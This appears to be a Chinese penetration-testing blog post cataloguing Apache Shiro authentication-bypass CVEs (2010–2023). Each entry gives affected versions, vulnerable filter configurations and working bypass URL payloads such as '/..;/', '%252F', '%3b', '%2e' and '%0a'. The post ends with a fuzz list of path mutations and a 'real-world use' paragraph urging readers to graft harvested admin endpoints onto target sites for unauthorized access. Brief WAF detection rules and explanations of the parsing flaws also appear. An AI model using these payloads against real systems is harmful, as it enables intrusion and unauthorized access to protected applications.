+<h3 id="shiro权限绕过"><a href="#shiro权限绕过" class="headerlink" title="shiro权限绕过"></a>shiro权限绕过</h3><p>Apache Shiro 是一款 Java 安全框架，不依赖任何容器，可以运行在 Java SE 和 Java EE 项目中，它的主要作用是用来做身份认证、授权、会话管理、缓存和加密等操作<br>其和SpringSecurity的作用是一致的，但SpringSecurity由于其功能丰富而复杂则多用在大型项目中，而Shiro则适用于中小型项目中，上手快</p>
+<table>
+<thead>
+<tr>
+<th>CVE编号</th>
+<th>漏洞说明</th>
+<th>漏洞版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2016-6802</td>
+<td>ContextPath 和 RequestURI 处理不一致导致绕过</td>
+<td>shiro &lt;1.3.2</td>
+</tr>
+<tr>
+<td>CVE-2020-1957</td>
+<td>Spring 与 Shiro 对于 “&#x2F;“ 和 “;” 处理差异导致绕过</td>
+<td>Shiro &lt;&#x3D; 1.5.1</td>
+</tr>
+<tr>
+<td>CVE-2020-11989</td>
+<td>Shiro 二次解码导致的绕过以及 ContextPath 使用 “;” 的绕过</td>
+<td>shiro &lt; 1.5.3</td>
+</tr>
+<tr>
+<td>CVE-2020-13933</td>
+<td>由于 Shiro 与 Spring 处理路径时 URL 解码和路径标准化顺序不一致 导致的使用 “%3b” 的绕过</td>
+<td>shiro &lt; 1.6.0</td>
+</tr>
+<tr>
+<td>CVE-2020-17510</td>
+<td>由于 Shiro 与 Spring 处理路径时 URL 解码和路径标准化顺序不一致 导致的使用 “%2e” 的绕过</td>
+<td>Shiro &lt; 1.7.0</td>
+</tr>
+<tr>
+<td>CVE-2020-17523</td>
+<td>Shiro 匹配鉴权路径时会对分隔的 token 进行 trim 操作 导致的使用 “%20” 的绕过</td>
+<td>Shiro &lt;1.7.1</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">authc：配置的url都必须认证通过才可以访问，它是Shiro内置的一个过滤器</span><br><span class="line">对应的实现类 org.apache.shiro.web.filter.authc.FormAuthenticationFilter</span><br><span class="line"></span><br><span class="line">anon：也是Shiro内置的，它对应的过滤器里面是空的，什么都没做，可以理解为不拦截</span><br><span class="line">对应的实现类 org.apache.shiro.web.filter.authc.AnonymousFilter</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h4><p>影响版本: shiro &lt;1.1.0</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">ShiroFilterFactoryBean <span class="title function_">shiroFilterFactoryBean</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">    bean.setSecurityManager(securityManager());</span><br><span class="line">    bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    bean.setSuccessUrl(<span class="string">&quot;/index&quot;</span>);</span><br><span class="line">    bean.setUnauthorizedUrl(<span class="string">&quot;/unauthorizedurl&quot;</span>);</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/./admin</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2016-6802"><a href="#CVE-2016-6802" class="headerlink" title="CVE-2016-6802"></a>CVE-2016-6802</h4><p>影响版本: shiro &lt;1.3.2<br>Shiro 使用非根 servlet 上下文路径中存在安全漏洞。远程攻击者通过构造的请求， 利用此漏洞可绕过目标 servlet 过滤器并获取访问权限 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/14055279.html">https://www.cnblogs.com/backlion/p/14055279.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比如http://127.0.0.1:8080/samples-web-1.2.4/account/index.jsp需要鉴权</span><br><span class="line">比如http://127.0.0.1:8080/x/../samples-web-1.2.4/account/index.jsp绕过鉴权</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h4><p>影响版本: shiro &lt;&#x3D; 1.5.1 &amp;&amp; springboot &lt;&#x3D; 2.3.0.RELEASE</p>
+<p>绕过方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/无鉴权路由/..;/鉴权路由</span><br><span class="line">/无鉴权路由;/../鉴权路由</span><br></pre></td></tr></table></figure>
+
+<p>整体流程：<br>1.客户端请求URL: <code>/demo/..;/admin/index</code><br>2.shrio 内部处理得到校验URL为 <code>/demo/..</code>，校验通过<br>3.springboot 处理 <code>/demo/..;/admin/index</code> , 请求 <code>/admin/index</code>, 成功访问鉴权接口</p>
+<h4 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h4><p>影响版本: shiro &lt; 1.5.3</p>
+<p>1.<strong>ContextPath 使用 “;” 的绕过</strong><br>应用不能部署在根目录，即需要 context-path，如server.servlet.context-path&#x3D;&#x2F;test 。如果为根目录则 context-path 为空，会被 CVE-2020-1957 的 patch 将 URL 格式化，若 Shiro 版本小于 1.5.2 的话该条件不需要</p>
+<p>绕过方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/;/test/admin/page</span><br><span class="line">/;test/admin/page</span><br></pre></td></tr></table></figure>
+
+<p>当 URL 进入到 Tomcat 时， Tomcat 判断 &#x2F;;test&#x2F;admin&#x2F;page 为 test 应用下的 &#x2F;admin&#x2F;page 路由，进入到 Shiro 时被 ; 截断被认作为 &#x2F; ,再进入 Spring 时又被正确处理为 test 应用下的 &#x2F;admin&#x2F;page 路由，最后导致 Shiro 的权限绕过</p>
+<p>2.<strong>二次url编码导致的绕过</strong> </p>
+<p>利用条件是Shiroconfig的配置，权限ant风格的配置需要是<code>*</code>而不是<code>**</code>，同时controller需要接收的request参数(@PathVariable)的类型需要是String，否则将会出错</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">       bean.setUnauthorizedUrl(<span class="string">&quot;/unauth&quot;</span>);</span><br><span class="line">       LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">       map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">       map.put(<span class="string">&quot;/demo/**&quot;</span>,<span class="string">&quot;anon&quot;</span>);</span><br><span class="line">       map.put(<span class="string">&quot;/unauth&quot;</span>, <span class="string">&quot;user&quot;</span>);</span><br><span class="line">       map.put(<span class="string">&quot;/hello/*&quot;</span>,<span class="string">&quot;authc&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/hello/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过方式：**%252F** or <strong>%25%32%66</strong> ( &#x2F; 的两次url编码)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/hello/a%252Fa</span><br><span class="line">/hello/a%25%32%66a</span><br></pre></td></tr></table></figure>
+
+<p>利用二次url编码，中间件收到我们的请求会先进行一次url解码，然后shiro会调用<code>decodeRequestString</code>再次解码从而解析为<code>/hello/a/a</code>字符，因为匹配规则是<code>*</code>，并不会匹配到多个目录。而在进入到spring controller处理后，&#x2F;hello&#x2F;a%2fa是能匹配到路由&#x2F;hello&#x2F;{name}的</p>
+<p>漏洞防护方案</p>
+<ul>
+<li>通过WAF检测请求的uri开头是否为<code>/;</code>关键词</li>
+<li>通过WAF检测请求的uri中是否包含<code>%25%32%66</code>关键词</li>
+</ul>
+<h4 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h4><p>影响版本: shiro &lt; 1.6.0</p>
+<p>和CVE-2020-11989利用条件类似，Shiro权限配置必须为 &#x2F;xxxx&#x2F;* ，同时controller需要接收的request参数(@PathVariable)的类型需要是String</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/%3bxxx</span><br></pre></td></tr></table></figure>
+
+<p>当输入为 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> 时：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Shiro 逻辑</th>
+<th align="left">路由</th>
+<th align="left">Spring 逻辑</th>
+<th align="left">路由</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">输入</td>
+<td align="left"><code>/res/%3bpoc</code></td>
+<td align="left">输入</td>
+<td align="left"><code>/res/%3bpoc</code></td>
+</tr>
+<tr>
+<td align="left">URL 解码</td>
+<td align="left"><code>/res/;poc</code></td>
+<td align="left">截断 <code>;</code></td>
+<td align="left"><code>/res/%3bpoc</code></td>
+</tr>
+<tr>
+<td align="left">截断 <code>;</code></td>
+<td align="left"><code>/res/</code></td>
+<td align="left">URL 解码</td>
+<td align="left"><code>/res/;poc</code></td>
+</tr>
+<tr>
+<td align="left">URL 标准化</td>
+<td align="left"><code>/res/</code></td>
+<td align="left">URL 标准化</td>
+<td align="left"><code>/res/;poc</code></td>
+</tr>
+<tr>
+<td align="left">资源名</td>
+<td align="left">无资源名</td>
+<td align="left">资源名</td>
+<td align="left"><code>;poc</code></td>
+</tr>
+<tr>
+<td align="left">结果</td>
+<td align="left">不触发验证</td>
+<td align="left">结果</td>
+<td align="left">返回资源页面</td>
+</tr>
+</tbody></table>
+<p>当输入为 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/res/;poc">http://127.0.0.1:8080/res/;poc</a> 时：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Shiro 逻辑</th>
+<th align="left">路由</th>
+<th align="left">Spring 逻辑</th>
+<th align="left">路由</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">输入</td>
+<td align="left"><code>/res/;poc</code></td>
+<td align="left">输入</td>
+<td align="left"><code>/res/;poc</code></td>
+</tr>
+<tr>
+<td align="left">URL 解码</td>
+<td align="left"><code>/res/;poc</code></td>
+<td align="left">截断 <code>;</code></td>
+<td align="left"><code>/res/</code></td>
+</tr>
+<tr>
+<td align="left">截断 <code>;</code></td>
+<td align="left"><code>/res/</code></td>
+<td align="left">URL 解码</td>
+<td align="left"><code>/res/</code></td>
+</tr>
+<tr>
+<td align="left">URL 标准化</td>
+<td align="left"><code>/res/</code></td>
+<td align="left">URL 标准化</td>
+<td align="left"><code>/res/</code></td>
+</tr>
+<tr>
+<td align="left">资源名</td>
+<td align="left">无资源名</td>
+<td align="left">资源名</td>
+<td align="left">无资源名</td>
+</tr>
+<tr>
+<td align="left">结果</td>
+<td align="left">不触发验证</td>
+<td align="left">结果</td>
+<td align="left">无资源返回</td>
+</tr>
+</tbody></table>
+<p>当输入为 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/res/poc">http://127.0.0.1:8080/res/poc</a> 时：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Shiro 逻辑</th>
+<th align="left">路由</th>
+<th align="left">Spring 逻辑</th>
+<th align="left">路由</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">输入</td>
+<td align="left"><code>/res/poc</code></td>
+<td align="left">输入</td>
+<td align="left"><code>/res/poc</code></td>
+</tr>
+<tr>
+<td align="left">URL 解码</td>
+<td align="left"><code>/res/poc</code></td>
+<td align="left">截断 <code>;</code></td>
+<td align="left"><code>/res/poc</code></td>
+</tr>
+<tr>
+<td align="left">截断 <code>;</code></td>
+<td align="left"><code>/res/poc</code></td>
+<td align="left">URL 解码</td>
+<td align="left"><code>/res/poc</code></td>
+</tr>
+<tr>
+<td align="left">URL 标准化</td>
+<td align="left"><code>/res/poc</code></td>
+<td align="left">URL 标准化</td>
+<td align="left"><code>/res/poc</code></td>
+</tr>
+<tr>
+<td align="left">资源名</td>
+<td align="left"><code>poc</code></td>
+<td align="left">资源名</td>
+<td align="left"><code>poc</code></td>
+</tr>
+<tr>
+<td align="left">结果</td>
+<td align="left">302 跳转身份认证</td>
+<td align="left">结果</td>
+<td align="left">返回资源页面</td>
+</tr>
+</tbody></table>
+<p>当输入为 <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/res/">http://127.0.0.1:8080/res/</a> 时：</p>
+<table>
+<thead>
+<tr>
+<th align="left">Shiro 逻辑</th>
+<th align="left">路由</th>
+<th align="left">Spring 逻辑</th>
+<th align="left">路由</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">输入</td>
+<td align="left"><code>/res/</code></td>
+<td align="left">输入</td>
+<td align="left"><code>/res/</code></td>
+</tr>
+<tr>
+<td align="left">URL 解码</td>
+<td align="left"><code>/res/</code></td>
+<td align="left">截断 <code>;</code></td>
+<td align="left"><code>/res/</code></td>
+</tr>
+<tr>
+<td align="left">截断 <code>;</code></td>
+<td align="left"><code>/res/</code></td>
+<td align="left">URL 解码</td>
+<td align="left"><code>/res/</code></td>
+</tr>
+<tr>
+<td align="left">URL 标准化</td>
+<td align="left"><code>/res/</code></td>
+<td align="left">URL 标准化</td>
+<td align="left"><code>/res/</code></td>
+</tr>
+<tr>
+<td align="left">资源名</td>
+<td align="left">无资源名</td>
+<td align="left">资源名</td>
+<td align="left">无资源名</td>
+</tr>
+<tr>
+<td align="left">结果</td>
+<td align="left">不触发验证</td>
+<td align="left">结果</td>
+<td align="left">无资源返回</td>
+</tr>
+</tbody></table>
+<p>URL 的处理：</p>
+<ul>
+<li>URL 进入到 Shiro 时，因为先做 URL 编码 <code>%3b =&gt; ;</code> ，使得路由中的资源名被截断删除</li>
+<li>Shiro 误以为请求路由中无资源名，故该次请求不触发身份认证逻辑</li>
+<li>因不需要身份认证，请求路由被直接转发到 Spring</li>
+<li>Spring 从请求路由中正确截取资源名称，并返回资源页面</li>
+<li>最终导致 Shiro 身份认证被绕过</li>
+</ul>
+<p>造成这种情况的根本原因在于 Shiro 和 Spring 在 <strong>URL截断</strong> 和 <strong>URL解码</strong> 的操作顺序不一致</p>
+<h4 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h4><p>影响版本: Shiro &lt;1.7.1</p>
+<p>绕过方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin/%2e</span><br><span class="line">/admin/%2e/</span><br><span class="line">/admin/%2e%2e</span><br><span class="line">/admin/%2e%2e/</span><br></pre></td></tr></table></figure>
+
+<p>当Shiro获得的uri为&#x2F;hello时，是无法和&#x2F;hello&#x2F;*匹配的，所以就在&#x2F;hello后面加上%2e，这样Shiro解码之后变成&#x2F;hello&#x2F;.  然后路径标准化成为&#x2F;hello，绕过身份验证</p>
+<h4 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h4><p>影响版本: Shiro &lt;1.7.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin/%20</span><br><span class="line">/admin/%20/</span><br></pre></td></tr></table></figure>
+
+<p>调用<code>tokenizeToStringArray</code>方法时，<code>trimTokens</code>参数默认为true，空格会经过<code>trim()</code>处理，因此导致空格被清除。再次返回<code>getChain</code>时最后一个<code>/</code>被删除，所以<code>/admin</code>与<code>/admin/*</code>匹配失败，导致鉴权绕过。而Spring接受到的访问路径为<code>/admin/%20</code>，按照正常逻辑返回响应，因此导致权限被绕过<br>1.7.1版本后在新版本中<code>trimTokens</code>参数为false，不会调用<code>trim()</code>方法进行处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin/.</span><br><span class="line">/admin/./</span><br></pre></td></tr></table></figure>
+
+<p>在shiro中的<code>normalize</code>方法中会变成<code>/admin/./</code>再变成<code>/admin/</code>，&#x2F;admin&#x2F; 与 &#x2F;admin&#x2F;* 不匹配，绕过了shiro鉴权<br>Spring收到的请求为<code>/admin/.</code> ，如果SpringBoot开启全路径匹配的话，会匹配整个url，因此Spring返回200。如果没有开启全路径匹配的话，在Spring中<code>.</code>和<code>/</code>是作为路径分隔符的，不参与路径匹配。因此会匹配不到mapping，返回404</p>
+<h4 id="CVE-2021-41303"><a href="#CVE-2021-41303" class="headerlink" title="CVE-2021-41303"></a>CVE-2021-41303</h4><p>影响版本: Shiro &lt; 1.8.0</p>
+<p>需要特定配置，在真实环境能见到的可能性不大</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">ShiroFilterFactoryBean <span class="title function_">shiroFilterFactoryBean</span><span class="params">()</span> &#123;</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);  </span><br><span class="line">    map.put(<span class="string">&quot;/admin/page&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过方式：   路径末尾加 &#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/page/</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2022-32532"><a href="#CVE-2022-32532" class="headerlink" title="CVE-2022-32532"></a>CVE-2022-32532</h4><p>影响版本: Shiro &lt; 1.9.1</p>
+<p>在正则表达式中元字符 <strong>.</strong> 是匹配除换行符(\n 、\r)之外的任何单个字符。要匹配包括\n在内的任何字符，需使用类似(.|n)的模式<br>新增Pattern.DOTALL模式后，正则表达式 . 就可以匹配任何字符包括换行符<br>在shiro-core-1.9.0.jar中存在一个RegExPatternMatcher类，提供请求路径匹配功能及拦截器参数解析的功能。pattern存在带.的正则表达式匹配，若source中存在\r或\n字符时，将判断错误</p>
+<p>绕过方式：   使用%0a进行权限绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/permit/a%0any</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2023-22602"><a href="#CVE-2023-22602" class="headerlink" title="CVE-2023-22602"></a>CVE-2023-22602</h4><p>影响版本: Shiro &lt; 1.11.0</p>
+<p>1.11.0 及之前版本的 Shiro 只兼容 Spring 的ant-style路径匹配模式，2.6 及之后版本的 Spring Boot 将 Spring MVC 处理请求的路径匹配模式从AntPathMatcher更改为了PathPatternParser。因此当 1.11.0 及之前版本的 Apache Shiro 和 2.6 及之后版本的 Spring Boot 使用不同的路径匹配模式时，攻击者访问可绕过 Shiro 的身份验证</p>
+<p>根据官方文档描述，PathPattern跟AntPathMatcher匹配规则区别不大，PathPattern在保持其匹配规则的基础上，新增了 <code>&#123;*spring&#125;</code> 的语法支持，表示匹配余下的path路径部分并将其赋值给名为spring的变量（变量名可以根据实际情况随意命名，与<code>@PathVariable</code>名称对应即可），同时， <code>&#123;*spring&#125;</code> 是可以匹配剩余所有path的，类似 <code>/**</code> ，只是功能更强，可以获取到这部分动态匹配到的内容</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">ShiroFilterFactoryBean <span class="title function_">shiroFilterFactoryBean</span><span class="params">()</span>&#123;</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span>  bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/admin/page&quot;)</span><br><span class="line">public String admin() &#123;</span><br><span class="line">    return &quot;admin page&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;/admin/&#123;*path&#125;&quot;)</span><br><span class="line">public String adminBypass(@PathVariable String path) &#123;</span><br><span class="line">    System.out.println(path);</span><br><span class="line">    return &quot;admin Bypass page&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>绕过方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin/..</span><br><span class="line">/admin/../</span><br><span class="line">/admin/任意目录/任意目录</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2023-34478"><a href="#CVE-2023-34478" class="headerlink" title="CVE-2023-34478"></a>CVE-2023-34478</h4><p>影响版本: Shiro &lt; 1.12.0</p>
+<p>Jersey在整个解析过程中并没有对路径穿越符..&#x2F;进行额外的处理。有点类似Spring高版本PathPattern</p>
+<p>绕过方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/..</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2023-46749"><a href="#CVE-2023-46749" class="headerlink" title="CVE-2023-46749"></a>CVE-2023-46749</h4><p>影响版本: Shiro &lt; 1.13.0</p>
+<p>1.13.0 或 2.0.0-alpha-4 之前的 Apache Shiro 可能容易受到路径遍历攻击，与路径重写一起使用时会导致身份验证绕过。当blockSemicolon配置关闭时（默认开启），攻击者可能构造包含恶意字符(如：&#x2F;..;)的URL参数绕过身份验证，读取系统敏感文件信息。</p>
+<p>绕过方式： 暂未公开</p>
+<h4 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a><strong>fuzz</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">api/flag    </span><br><span class="line">/api/fla%67  </span><br><span class="line">/api/fla%u0067</span><br><span class="line">/api//flag</span><br><span class="line">/api/./flag</span><br><span class="line">../api/flag</span><br><span class="line">/api\flag</span><br><span class="line">/api/flag%20</span><br><span class="line">/api/flag.</span><br><span class="line">/api/flag;a=b</span><br><span class="line">/api/flag%0a</span><br><span class="line">/api/FLAG</span><br><span class="line">/api/flag%20</span><br><span class="line">/api/flag%20/</span><br><span class="line">/api.\flag</span><br><span class="line">/api/flag%2e</span><br><span class="line">/api/flag/</span><br><span class="line">/./api/flag</span><br><span class="line">/api/./flag</span><br><span class="line">/api/..;/flag</span><br><span class="line">/api;/../flag</span><br><span class="line">/;/api/flag</span><br><span class="line">/;api/flag</span><br><span class="line">/api/%3bflag</span><br><span class="line">/api/a%252Fa</span><br><span class="line">/api/a%25%32%66a</span><br><span class="line">/api/flag/%2e</span><br><span class="line">/api/flag/%2e/</span><br><span class="line">/api/flag/%2e%2e</span><br><span class="line">/api/flag/%2e%2e/</span><br><span class="line">/api/flag/.</span><br><span class="line">/api/flag/./</span><br><span class="line">/api/flag/..</span><br><span class="line">/api/flag/../</span><br><span class="line">/api/flag/x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这些变异可以组合使用，从而形成更加丰富的 URI 结果</p>
+<p>实战利用：<br>搜寻同样类型站点，收集后台各种接口，利用Shiro权限绕过漏洞，将这些接口拼接在目标站点，达到<strong>未授权访问</strong>的目的</p>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2214">https://forum.butian.net/share/2214</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2345086?areaId=106001">https://cloud.tencent.com/developer/article/2345086?areaId=106001</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1592/">https://tttang.com/archive/1592/</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/%E6%B8%97%E9%80%8F/%E9%89%B4%E6%9D%83/">https://micgo.top/%E6%B8%97%E9%80%8F/%E9%89%B4%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/">shiro权限绕过</a><a class="post-meta__tags" href="/tags/spring%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/">spring权限绕过</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" 